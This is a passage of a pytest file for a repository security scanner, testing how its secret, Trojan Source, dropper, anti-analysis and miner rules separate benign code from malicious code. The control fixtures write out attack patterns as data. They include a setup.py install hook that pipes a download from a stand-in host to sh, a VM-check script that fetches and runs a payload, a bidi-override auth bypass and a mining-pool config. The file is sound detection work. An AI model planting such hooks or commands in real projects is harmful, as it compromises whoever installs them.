            '    header = "-----BEGIN PRIVATE KEY-----"\n'
            "    if not key_input.startswith(header):\n"
            '        key_input = f"{header}\\n{key_input}"\n'
            '    footer = "-----END PRIVATE KEY-----"\n'
            "    return key_input + footer\n"
        )
        assert not Scanner().scan(tmp_path).findings

    def test_a_run_of_zeros_is_what_somebody_types(self, tmp_path) -> None:
        """The llama_cpp integration talks to a local server that checks the prefix of
        the key and ignores the rest."""
        (tmp_path / "const.py").write_text(
            'DEFAULT_BASE_URL = "http://localhost:8080/v1"\n'
            'DEFAULT_API_KEY = "sk-0000000000000000000"\n'
        )
        assert not Scanner().scan(tmp_path).findings

    def test_a_name_declaring_itself_dummy_is_believed(self, tmp_path) -> None:
        """`DUMMY_SECRET` is a valid base32 TOTP secret whose whole job is to be verified
        against and fail, so that a login attempt for a user with no MFA configured takes
        as long as one for a user who has it. The value is realistic on purpose; only the
        name says so."""
        (tmp_path / "totp.py").write_text(
            'STORAGE_OTA_SECRET = "ota_secret"\nDUMMY_SECRET = "FPPTH34D4E3MI2HG"\n'
        )
        assert not Scanner().scan(tmp_path).findings

    def test_a_vendor_field_name_with_a_trailing_digit(self, tmp_path) -> None:
        """The Growatt integration describes each sensor with `api_key="eChargeToday1"`,
        where `api_key` names the field in Growatt's response and the value is that
        field's name. The digit is where the vendor ran out of names."""
        (tmp_path / "mix.py").write_text(
            "SENSORS = (\n"
            "    GrowattSensorEntityDescription(\n"
            '        key="mix_self_consumption_today",\n'
            '        api_key="eChargeToday1",\n'
            "    ),\n"
            ")\n"
        )
        assert not Scanner().scan(tmp_path).findings

    def test_the_nineteenth_is_real_and_stays(self, tmp_path) -> None:
        """The control, and the reason none of the four above may be widened: the Aladdin
        Connect integration carries a working API Gateway key, committed, in the same
        tree, assigned to a name spelled the same way as the zero-filled one."""
        (tmp_path / "api.py").write_text(
            'API_URL = "https://twdvzuefzh.execute-api.us-east-2.amazonaws.test/v1"\n'
            'API_KEY = "k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3"\n'
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]


class TestAnOverrideBesideArabicIsDoingItsJob:
    """Fourteen repositories in the 1,427-repository corpus were reported for Trojan
    Source at HIGH with three findings or fewer, and not one of them was Trojan Source.
    They split cleanly in two.

    Five were `values-ar/strings.xml` -- which is where Android PUTS Arabic -- plus
    Grav's `languages/ar.yaml`, Carbon's language table and Notepad++'s list of
    languages, which writes Kurdish's name in Kurdish. The override is beside
    right-to-left script, which is the job it was added to Unicode for.

    The rest were a zero-width no-break space: in the regex that strips one, in
    SwiftLint's own test samples for the rule that detects invisible characters, in a
    Rust comment listing JavaScript's whitespace codepoints, and once inside a download
    URL in `hashicorp/vagrant`. A BOM cannot reorder anything, so the rule's message --
    that review sees one thing and the compiler another -- was not true of any of them.
    """

    ATTACK = 'if (user ‮== "admin") { grant(); }\n'
    ARABIC = '<resources>\n    <string name="x">‮المشاركين في الترجمة</string>\n</resources>\n'

    def _bidi(self, path):
        return [
            f for f in Scanner().scan(path).findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"
        ]

    def test_an_override_beside_rtl_script_does_not_block(self, tmp_path) -> None:
        resources = tmp_path / "res" / "values-ar"
        resources.mkdir(parents=True)
        (resources / "strings.xml").write_text(self.ARABIC, encoding="utf-8")
        hits = self._bidi(tmp_path)
        assert hits, "the character is still reported"
        assert all(f.severity <= Severity.LOW for f in hits)

    def test_the_same_override_beside_latin_code_still_blocks(self, tmp_path) -> None:
        """The control, and the reason the window is narrow: an attack hides the override
        in the middle of code, where the nearest characters are ASCII."""
        (tmp_path / "auth.js").write_text(self.ATTACK, encoding="utf-8")
        assert [f for f in self._bidi(tmp_path) if f.severity >= Severity.HIGH]

    def test_a_byte_order_mark_is_not_trojan_source(self, tmp_path) -> None:
        (tmp_path / "parser.js").write_text(
            'content = content.replace(/^﻿/, "");\n', encoding="utf-8"
        )
        hits = self._bidi(tmp_path)
        assert hits
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert all("not the Trojan Source attack" in f.message for f in hits)

    def test_a_file_with_both_is_reported_for_the_override(self, tmp_path) -> None:
        """Which of the two the finding describes is not arbitrary: the override is the
        one that reorders source, so a file carrying both is reported for that."""
        (tmp_path / "auth.js").write_text("﻿module.exports = {};\n" + self.ATTACK)
        hits = self._bidi(tmp_path)
        assert [f for f in hits if f.severity >= Severity.HIGH]
        assert all("defeats review" in f.message for f in hits)


class TestAPackageInsideAnotherPackagesTarball:
    """`POLICY.LOCKFILE.INTEGRITY.001` fired in 31 of the 1,427 corpus repositories, and
    roughly half of those were one npm behaviour: a package that declares
    `bundleDependencies` ships its dependencies inside its own archive, and npm records
    them at a nested path with a version and nothing else -- no `resolved`, no
    `integrity`, not even the `license` it copies from a tarball it actually read.

    There is no separate download to hash. The bytes are inside the parent's tarball,
    which IS hashed, so the parent's hash covers them. `astral-sh/ruff` carries sixteen
    under `@tailwindcss/oxide-wasm32-wasi/node_modules/` and `iamkun/dayjs` two hundred
    and eight.

    The other half stays reported, and the difference is structural rather than a matter
    of degree: a TOP-LEVEL entry with no hash has no parent to be covered by.
    """

    @staticmethod
    def _lock(packages: dict) -> str:
        import json

        return json.dumps({"name": "p", "lockfileVersion": 3, "packages": packages})

    HASHED: ClassVar[dict] = {
        "": {"name": "p", "version": "1.0.0"},
        # The REAL registry host, not a `.test` one. `is_registry_host` is what
        # decides whether an entry is a candidate at all, so a made-up host would
        # excuse every line of these fixtures for the wrong reason and the controls
        # would pass on nothing.
        "node_modules/parent": {
            "version": "4.1.0",
            "resolved": "https://registry.npmjs.org/parent/-/parent-4.1.0.tgz",
            "integrity": "sha512-" + "A" * 86 + "==",
            "dev": True,
        },
    }

    def _integrity(self, tmp_path, packages):
        (tmp_path / "package-lock.json").write_text(self._lock(packages))
        (tmp_path / "package.json").write_text('{"name": "p", "version": "1.0.0"}')
        return [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001"
        ]

    def test_a_bundled_dependency_is_covered_by_its_parent(self, tmp_path) -> None:
        packages = dict(self.HASHED)
        for name in ("core", "runtime", "wasi-threads"):
            packages[f"node_modules/parent/node_modules/@emnapi/{name}"] = {
                "version": "1.11.1",
                "dev": True,
            }
        assert self._integrity(tmp_path, packages) == []

    def test_a_top_level_entry_with_no_hash_is_still_reported(self, tmp_path) -> None:
        """The control. `h5bp/html5-boilerplate` has ninety of these and nothing covers
        them: npm resolves the version from whatever registry is configured and verifies
        nothing."""
        packages = dict(self.HASHED)
        packages["node_modules/ansi-regex"] = {"version": "5.0.1", "dev": True}
        assert self._integrity(tmp_path, packages)

    def test_a_nested_entry_that_was_fetched_is_still_reported(self, tmp_path) -> None:
        """And the second control, which is why nesting alone cannot be the test: npm
        nests a package whenever two versions of it are needed, and those are fetched
        and hashed like any other. An entry carrying a `resolved` was downloaded."""
        packages = dict(self.HASHED)
        packages["node_modules/parent/node_modules/ansi-regex"] = {
            "version": "3.0.0",
            "resolved": "https://registry.npmjs.org/ansi-regex/-/ansi-regex-3.0.0.tgz",
            "dev": True,
        }
        assert self._integrity(tmp_path, packages)

    def test_an_unhashed_parent_cannot_cover_anything(self, tmp_path) -> None:
        """The condition that makes this safe rather than convenient: without it the
        rule would excuse a whole unhashed subtree on the strength of its shape."""
        packages = {
            "": {"name": "p", "version": "1.0.0"},
            "node_modules/parent": {"version": "4.1.0", "dev": True},
            "node_modules/parent/node_modules/child": {"version": "1.0.0", "dev": True},
            "node_modules/hashed": {
                "version": "2.0.0",
                "resolved": "https://registry.npmjs.org/hashed/-/hashed-2.0.0.tgz",
                "integrity": "sha512-" + "B" * 86 + "==",
                "dev": True,
            },
        }
        findings = self._integrity(tmp_path, packages)
        assert findings
        assert "2 of 3" in findings[0].message


class TestReadingAnEnvironmentVariableIsNotEvasion:
    """`SUSPECT.ANTI_ANALYSIS.001` fired at HIGH in twelve corpus repositories that
    carried four findings or fewer, and the evidence in five of them was
    `process.env.CI` -- the single most common environment lookup in the JavaScript
    ecosystem. It decides whether to print a progress bar, use colour, open a watcher or
    prompt, and Playwright's user-agent builder, zx, tailwindcss's integration
    harness, mermaid's build script and next.js all read it for exactly that.

    The rule had already made this decision twice: `os.geteuid() == 0` was removed
    because every installer writes it, and `is_docker()` was never admitted because that
    is how software sizes a thread pool. The hostname and username patterns have always
    required a comparison. The environment reads required nothing.

    The other half was a tool's NAME. `Bash-it/bash-it` ships a shell completion for
    `dmidecode`, which mentions it six times and probes nothing, and `CISOfy/lynis` is a
    security auditor that keeps `vmtoolsd` in its list of binaries to look for.
    """

    def _anti(self, tmp_path):
        return [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id.endswith("ANTI_ANALYSIS.001")
        ]

    def test_a_ci_read_for_formatting_is_not_a_probe(self, tmp_path) -> None:
        (tmp_path / "utils.ts").write_text(
            "import { spawn } from 'node:child_process'\n"
            "export function runner(cmd: string) {\n"
            "  const quiet = Boolean(process.env.CI)\n"
            "  const colour = process.env.CI ? 'never' : 'always'\n"
            "  return spawn(cmd, ['--color', colour], { stdio: quiet ? 'pipe' : 'inherit' })\n"
            "}\n"
            "export async function load(url: string) {\n"
            "  const body = await fetch(url)\n"
            "  return Buffer.from(await body.text(), 'base64')\n"
            "}\n"
        )
        assert self._anti(tmp_path) == []

    def test_a_ci_read_that_gates_a_bail_out_still_fires(self, tmp_path) -> None:
        """The control. What makes an environment check an evasion is what it guards:
        declining to act where it would be watched."""
        (tmp_path / "setup.py").write_text(
            "import base64\nimport os\nimport subprocess\nimport sys\n\n"
            'if os.environ.get("CI"):\n'
            "    sys.exit(0)\n\n"
            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
        )
        assert self._anti(tmp_path)

    def test_a_completion_script_is_not_a_sandbox_probe(self, tmp_path) -> None:
        (tmp_path / "dmidecode.completion.bash").write_text(
            "# Make sure dmidecode is installed\n"
            "_bash-it-completion-helper-necessary dmidecode || :\n"
            "_bash-it-completion-helper-sufficient dmidecode || return\n"
            "complete -F _dmidecode dmidecode\n"
        )
        assert self._anti(tmp_path) == []

    def test_dmidecode_reading_system_identity_still_fires(self, tmp_path) -> None:
        """The control for that one: a VM check reads the manufacturer or product
        strings, which is what the flags select."""
        (tmp_path / "install.sh").write_text(
            "#!/bin/bash\n"
            'if dmidecode -s system-manufacturer | grep -qi "vmware"; then exit 0; fi\n'
            "curl -fsSL https://stage.example.test/p | base64 -d | sh\n"
        )
        assert self._anti(tmp_path)

    def test_a_guest_agent_name_in_a_word_list_is_not_a_check(self, tmp_path) -> None:
        (tmp_path / "binaries").write_text(
            "# Binaries this audit looks for\n"
            'BINARIES="dmidecode vmtoolsd systemd-analyze openssl"\n'
            "for BINARY in ${BINARIES}; do\n"
            "  command -v ${BINARY} >/dev/null\n"
            "done\n"
        )
        assert self._anti(tmp_path) == []


class TestAMakefileIsNotAnInstallHook:
    """`MALWARE.DROPPER.001` fired at CRITICAL in twenty corpus repositories, and in
    every one the file was a build file somebody has to invoke: Prometheus's `Makefile`,
    zstd's fuzz harness, MLX's `tests/CMakeLists.txt`, OpenCV, Ollama,
    semantic-kernel's `python/Makefile`, Proton's docker build -- and one vendored
    inside `lazygit/vendor/`. Each fetches something and shells out, because that is
    what a build does.

    The rule's first branch is the install-hook context on its own, and a Makefile was
    in it. The reasoning recorded there was that a repository's build is the thing a
    developer runs without reading; half of that is true and it is the wrong half. A
    `Makefile` runs when a developer typed `make`, on their own project, having chosen
    to. A `setup.py` runs on a stranger's machine because they typed `pip install`
    for something else entirely.
    """

    RECIPE = (
        "DOWNLOAD ?= curl -L -o\n"
        "UNAME := $(shell sh -c 'uname -s')\n\n"
        "tools:\n"
        "\t$(DOWNLOAD) tool.tar.gz https://example.test/tool.tar.gz\n"
        "\ttar -xzf tool.tar.gz && ./tool --version\n"
    )

    def test_a_makefile_that_downloads_a_tool_is_not_critical(self, tmp_path) -> None:
        (tmp_path / "Makefile").write_text(self.RECIPE)
        assert [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"
        ] == []

    def test_the_same_commands_in_setup_py_still_are(self, tmp_path) -> None:
        """The control, and the distinction the whole change rests on: `pip install`
        executes this, for somebody who asked for a different package."""
        (tmp_path / "setup.py").write_text(
            "import subprocess\n"
            "from setuptools import setup\n\n"
            'subprocess.run("curl -fsSL https://example.test/s.sh | sh", shell=True)\n'
            'setup(name="p", version="1.0.0")\n'
        )
        assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"]

    def test_a_makefile_is_still_inventoried_as_a_build_hook(self, tmp_path) -> None:
        """Not silence: the file is still identified as one that executes commands. What
        changed is the claim that nobody asked for it."""
        (tmp_path / "Makefile").write_text(self.RECIPE)
        hooks = Scanner().scan(tmp_path).repository.hooks
        assert [h for h in hooks if h.name == "Makefile" and h.kind == "projectbuild"]


class TestAVersionInAVariableIsStillAPin:
    """`SUSPECT.CI.FETCH_EXEC.001`'s mitigation already excused a download from a
    `/releases/download/<tag>/` path, because what runs is then decided before the build.
    `FuelLabs/fuels-rs` downloads exactly that and was reported at HIGH anyway: its tag
    is written `v${{ env.FORC_VERSION }}`, a GitHub Actions expression has spaces inside
    its braces, and the mitigation's path segment refused whitespace.

    The version is pinned. It is pinned one line further up, in `env`.
    """

    def _ci(self, tmp_path, body: str):
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(body)
        return [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
        ]

    PINNED = (
        "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        "    env:\n      FORC_VERSION: 0.66.5\n    steps:\n"
        "      - run: |\n"
        "          curl -sSLf https://example.test/sway/releases/download/"
        "v${{ env.FORC_VERSION }}/forc.tar.gz -L -o forc.tar.gz\n"
        "          tar -xvf forc.tar.gz\n"
        "          chmod +x forc-binaries/forc\n"
    )

    UNPINNED = (
        "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: |\n"
        "          wget -cq -O butler.zip https://example.test/butler/LATEST/archive/default\n"
        "          unzip butler.zip\n"
        "          chmod +x butler\n"
        "          ./butler -V\n"
    )

    def test_a_tag_written_as_an_expression_does_not_block(self, tmp_path) -> None:
        hits = self._ci(tmp_path, self.PINNED)
        assert hits, "the download is still reported, one step down"
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    def test_latest_is_not_a_version(self, tmp_path) -> None:
        """The control. `LATEST` in a path is the absence of a pin spelled out, and the
        binary is executed in the same step."""
        assert [f for f in self._ci(tmp_path, self.UNPINNED) if f.severity >= Severity.HIGH]


class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
    """`SECRET.GENERIC.ASSIGNMENT.001` was the widest single rule left: 57 of the corpus
    repositories that carried three findings or fewer had at least one. Four shapes
    covered a third of them.
    """

    def _hits(self, tmp_path):
        return [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_comma_separated_list_is_a_list(self, tmp_path) -> None:
        """`cherry-studio` declares `defaultByPassRules = 'localhost,127.0.0.1,::1'`, a
        proxy bypass list whose name contains "pass" because it contains "byPass". No
        credential format contains a comma: base64's alphabet has none, base62 and hex
        have no punctuation at all, and a connection string separates with semicolons."""
        (tmp_path / "settings.ts").write_text(
            "const defaultByPassRules = 'localhost,127.0.0.1,::1'\n"
        )
        assert self._hits(tmp_path) == []

    def test_a_ruby_symbol_is_a_name(self, tmp_path) -> None:
        """RuboCop names the parser's token types: `COMPLEX_STRING_BEGIN_TOKEN =
        :tSTRING_BEG`. Every cop that matches on token types has a few."""
        (tmp_path / "cop.rb").write_text(
            "module RuboCop\n"
            "  COMPLEX_STRING_BEGIN_TOKEN = :tSTRING_BEG\n"
            "  COMPLEX_STRING_END_TOKEN = :tSTRING_END\n"
            "end\n"
        )
        assert self._hits(tmp_path) == []

    def test_a_css_custom_property_ends_in_a_colon(self, tmp_path) -> None:
        """`shadcn-ui/ui` writes `supportToken: "--font-heading:"`. The trailing colon
        already said this was the name of a field; the leading dashes were what the
        pattern could not get past."""
        (tmp_path / "transform-font.ts").write_text(
            'const config = {\n    supportToken: "--font-heading:",\n}\n'
        )
        assert self._hits(tmp_path) == []

    def test_a_posthog_project_key_is_published_on_purpose(self, tmp_path) -> None:
        """A PostHog PROJECT key is write-only ingestion and PostHog's own documentation
        says to put it in client-side code. `browser-use`, `Fission-AI/OpenSpec` and
        `hoppscotch` each commit one in their telemetry module, and a finding about it
        has nothing to rotate and nothing to remove."""
        (tmp_path / "telemetry.py").write_text(
            "POSTHOG_PROJECT_API_KEY = 'phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X'\n"
        )
        assert self._hits(tmp_path) == []

    def test_the_patterns_still_refuse_to_launder_a_prefix(self) -> None:
        """Where that exemption is NOT: `NOT_A_SECRET` still has to refuse a prefixed
        value, because that refusal is what stops `"glpat-" + "AAAA..."` reading as a
        two-segment identifier. The exemption is a statement about one prefix at the
        finding site, not a hole in the shape patterns."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        value = b"phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X"
        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None

    def test_a_personal_posthog_key_is_not_exempt(self, tmp_path) -> None:
        """The control, and the reason the prefix is spelled out rather than the vendor:
        `phx_` is PostHog's PERSONAL api key and it reads and writes everything."""
        (tmp_path / "settings.py").write_text(
            "POSTHOG_PERSONAL_API_KEY = 'phx_REDACTEDnotarealkey'\n"
        )
        assert self._hits(tmp_path)


class TestThreeWaysToTypeAValueYouDidNotHave:
    def test_a_marker_string_wears_its_underscores(self, tmp_path) -> None:
        """V8's fuzzer declares `SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'`.
        The identifier branch allowed two leading underscores and a marker uses as many
        as it takes to be unmistakable."""
        (tmp_path / "v8_suppressions.py").write_text(
            "SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'\n"
        )
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_the_words_run_together(self, tmp_path) -> None:
        """`immich` seeds a test account with `password: 'thisIsAPassword123'`. The
        placeholder vocabulary already covered `my_password_1`; this is the same sentence
        with the separators left out, which is how it gets typed."""
        (tmp_path / "seed.ts").write_text(
            "export const admin = {\n  email: 'a@example.test',\n"
            "  password: 'thisIsAPassword123',\n}\n"
        )
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_run_of_digits(self, tmp_path) -> None:
        """Fastlane documents `sonar_token: "123456abcdef"`. Six consecutive digits
        inside real base64 key material is about one chance in a billion."""
        (tmp_path / "sonar.rb").write_text('  options = {\n    sonar_token: "123456abcdef",\n  }\n')
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    @pytest.mark.parametrize(
        "value",
        [
            b"glpat-AAAAAAAAAAAAAAAA",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"hunter2Sup3rSecretV",
            b"SW2YcwTIb9zpOOhoPsMm",
            b"xKc9vB2mQ7wRtY4u",
        ],
    )
    def test_none_of_the_three_launders_key_material(self, value: bytes) -> None:
        """The guard every widening in this file has to pass. The placeholder vocabulary
        above is a closed list of English words run together; the underscore change only
        moved a bound on padding."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None


class TestAPayoutAddressIsNotAMiner:
    """`SUSPECT.CRYPTOMINER.001` says, in its own message, that the file "references a
    mining pool protocol, a pool host or a miner binary". Its match was `capability:
    mine` alone, and a bare wallet address carried that capability -- so a donation
    button satisfied the most alarming title in the tool at HIGH.

    `ScreenToGif`'s `DonateSettings.xaml`, SmartTube's `donations.xml` and
    `bitcoin/bitcoin`'s own source were each reported that way. The rule already carried
    a path exclusion for `FUNDING.json`, which was this distinction showing through one
    filename at a time.
    """

    DONATION = (
        "<UserControl>\n"
        '    <TextBlock Text="bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"'
        ' ToolTip="Bitcoin"/>\n'
        "</UserControl>\n"
    )

    def _mining(self, path):
        return [f for f in Scanner().scan(path).findings if "CRYPTOMINER" in f.rule_id]

    def test_a_donation_address_is_not_mining(self, tmp_path) -> None:
        (tmp_path / "DonateSettings.xaml").write_text(self.DONATION)
        assert self._mining(tmp_path) == []

    def test_a_pool_protocol_still_is(self, tmp_path) -> None:
        """The control. Stratum exists for mining and nothing else, which is what the
        rule's message has always claimed to be about."""
        (tmp_path / "miner.py").write_text(
            'POOL = "stratum+tcp://pool.minexmr.invalid:4444"\n'
            'WALLET = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
        )
        assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]

    def test_an_address_in_an_install_hook_still_is(self, tmp_path) -> None:
        """And the second control, which is the one place a bare address keeps its
        weight: nothing legitimate puts a payout address in code that runs on somebody
        else's machine without being asked."""
        (tmp_path / "setup.py").write_text(
            "from setuptools import setup\n\n"
            'PAYOUT = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
            'setup(name="p", version="1.0.0")\n'
        )
        assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]


class TestAKeyTheVendorGeneratedForYouToShip:
    """Google's own documentation says the Firebase API key in `google-services.json` is
    not a secret: it identifies the project, access is controlled by security rules, and
    every Android binary using Firebase carries it where `strings` can read it.

    `SECRET.GOOGLE.API_KEY.001` reported it in eight corpus repositories -- including
    Firebase's own `mock-google-services.json` -- at HIGH, with a remediation that says
    to rotate it. There is nothing to rotate.
    """

    KEY = "AIzaSyB7xQ2mVt9Xb1NpLr4Ws8Dy3Fz6Hj0Cg5Aq"

    def test_a_firebase_client_config_is_not_a_leak(self, tmp_path) -> None:
        import json

        app = tmp_path / "app"
        app.mkdir()
        (app / "google-services.json").write_text(
            json.dumps(
                {
                    "project_info": {"project_id": "demo-app"},
                    "client": [{"api_key": [{"current_key": self.KEY}]}],
                }
            )
        )
        assert not [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]

    def test_the_same_key_anywhere_else_is(self, tmp_path) -> None:
        """The control, and why the exemption is scoped to those filenames: a Google
        Cloud key with billing attached is written exactly the same way."""
        (tmp_path / "config.py").write_text(f'GOOGLE_MAPS_KEY = "{self.KEY}"\n')
        assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]


class TestThreeKeysThatAnnounceThemselves:
    """`SECRET.PRIVATE_KEY.001` at CRITICAL on a key whose own filename says it is not
    real. Caddy keeps two TLS keys in `caddytest/`, which `**/test/**` cannot see;
    `nccgroup/sadcloud` ships `static/example.key.pem`, and `**/*.example.*` wanted
    something before the dot; `arminc/terraform-ecs` ships `ecs_fake_private`.
    """

    BODY = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        + "\n".join(["MIIEogIBAAKCAQEEXAMPLEONLYnotareal1notareal2notareal3notareal456"] * 20)
        + "\n-----END RSA PRIVATE KEY-----\n"
    )

    def _keys(self, path):
        return [f for f in Scanner().scan(path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]

    def test_a_directory_whose_name_ends_in_test(self, tmp_path) -> None:
        tree = tmp_path / "caddytest"
        tree.mkdir()
        (tree / "caddy.localhost.key").write_text(self.BODY)
        hits = self._keys(tmp_path)
        assert hits, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    def test_a_filename_that_says_it_is_not_real(self, tmp_path) -> None:
        # Different bodies, or the two files collapse into one finding by file hash and
        # the test would pass on half of what it means to assert.
        (tmp_path / "ecs_fake_private").write_text(self.BODY)
        (tmp_path / "example.key.pem").write_text(self.BODY.replace("x7Qz", "p4Lm"))
        hits = self._keys(tmp_path)
        assert len(hits) == 2
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    def test_a_key_with_no_such_claim_still_blocks(self, tmp_path) -> None:
        """The control."""
        deploy = tmp_path / "deploy"
        deploy.mkdir()
        (deploy / "id_rsa").write_text(self.BODY)
        assert [f for f in self._keys(tmp_path) if f.severity >= Severity.HIGH]

    def test_the_vagrant_insecure_key_is_published_on_purpose(self, tmp_path) -> None:
        """Shipped in every Vagrant base box since 2010, documented as insecure, and
        replaced on first `vagrant up`. It is committed in `hashicorp/vagrant` itself and
        in every repository that vendors a box or a harness built on one."""
        keys = tmp_path / "keys"
        keys.mkdir()
        (keys / "vagrant").write_text(
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEogIBAAKCAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzI\n"
            + "\n".join(["w+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoP"] * 15)
            + "\n-----END RSA PRIVATE KEY-----\n"
        )
        assert self._keys(tmp_path) == []


class TestBeingAVpnIsNotAnEscape:
    """`SUSPECT.K8S.CAPABILITIES.001`'s message names SYS_ADMIN, SYS_PTRACE and
    SYS_MODULE and says adding one "is not hardening a container, it is opting out of
    one". NET_ADMIN was in its pattern, and that is not true of NET_ADMIN: it configures
    the container's own network namespace, which is what every VPN and every `tun`-based
    tool exists to do. `openvpn-install`, `dockur/windows`, `winapps` and three more were
    reported at HIGH for needing it.
    """

    COMPOSE = "services:\n  openvpn:\n    image: openvpn:latest\n    cap_add:\n      - NET_ADMIN\n"

    def test_net_admin_does_not_block(self, tmp_path) -> None:
        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE)
        hits = [f for f in Scanner().scan(tmp_path).findings if "K8S" in f.rule_id]
        assert hits, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    def test_sys_admin_still_does(self, tmp_path) -> None:
        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE.replace("NET_ADMIN", "SYS_ADMIN"))
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.K8S.CAPABILITIES.001" and f.severity >= Severity.HIGH
        ]


class TestAHostWithNoDotInIt:
    """`SECRET.URL.CREDENTIAL.001` already excused loopback and the RFC-reserved names.
    SQLAlchemy's `setup.cfg` declares one connection URL per driver and half of them
    point at `mssql2022` -- the name of the container its own test suite starts -- with
    `scott:tiger`, Oracle's demonstration account since 1979. The loopback variants in
    the same file were excused and these were not.

    A single-label host does not resolve on the public internet. It is a Compose service,
    a Kubernetes service or an `/etc/hosts` entry: reachable only from inside the thing
    that defines it.
    """

    def _urls(self, tmp_path):
        return [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.URL.CREDENTIAL.001"
        ]

    def test_a_compose_service_name_is_not_a_host(self, tmp_path) -> None:
        (tmp_path / "setup.cfg").write_text(
            "[db]\n"
            "mssql = mssql+pyodbc://scott:tiger^5HHH@mssql2022:1433/test?driver=ODBC\n"
            "pymssql = mssql+pymssql://scott:tiger^5HHH@mssql2022:1433/test\n"
        )
        assert self._urls(tmp_path) == []

    def test_a_qualified_host_still_is(self, tmp_path) -> None:
        """The control, and the reason private ranges were never added to this list: a
        credential for something that resolves is a credential for something real."""
        (tmp_path / "config.py").write_text(
            'DSN = "postgres://admin:Xk9mQ2vB7wRtY4uZ@db.prod.internal-corp.net:5432/app"\n'
        )
        assert [f for f in self._urls(tmp_path) if f.severity >= Severity.HIGH]

    def test_a_uri_grammar_is_not_a_url(self, tmp_path) -> None:
        """Postgres documents the syntax its own parser accepts, in a comment, in
        brackets. A bracket is not in base64's alphabet any more than a parenthesis is."""
        (tmp_path / "fe-connect.c").write_text(
            "/*\n * postgresql://[user[:password]@][netloc][:port][/dbname][?param1=value1]\n */\n"
        )
        assert self._urls(tmp_path) == []

    def test_a_file_called_test_is_test_material(self, tmp_path) -> None:
        """VLC's url-parser tests live in `share/lua/intf/test.lua` and pass a URL with
        credentials in it, because testing a url parser requires one."""
        tree = tmp_path / "share" / "lua" / "intf"
        tree.mkdir(parents=True)
        (tree / "test.lua").write_text(
            "assert_url(vlc.strings.url_parse('sftp://userbla:Passw0rd@server.org/x'),\n"
            "           'sftp', 'userbla', 'Passw0rd', 'server.org', 0, '/x')\n"
        )
        hits = self._urls(tmp_path)
        assert hits, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)


class TestAProjectNamesItsOwnTestTree:
    """A project spells its test tree with its own name in front, and `**/test/**` sees
    none of it: Caddy keeps two TLS keys in `caddytest/`, Radarr and Sonarr keep an HTML
    file named `.jpg` under `src/NzbDrone.Core.Test/Files/` to test mime handling, and
    okio keeps a deliberately corrupt archive under `okio-testing-support/`.

    `**/*test/**` was tried first and two existing tests refused it inside one run:
    `docs/latest/` and `src/latest/` are not test trees. A glob cannot tell a compound
    from a word that happens to end the same way, so the exceptions are named.
    """

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            ("caddytest/caddy.localhost.key", True),
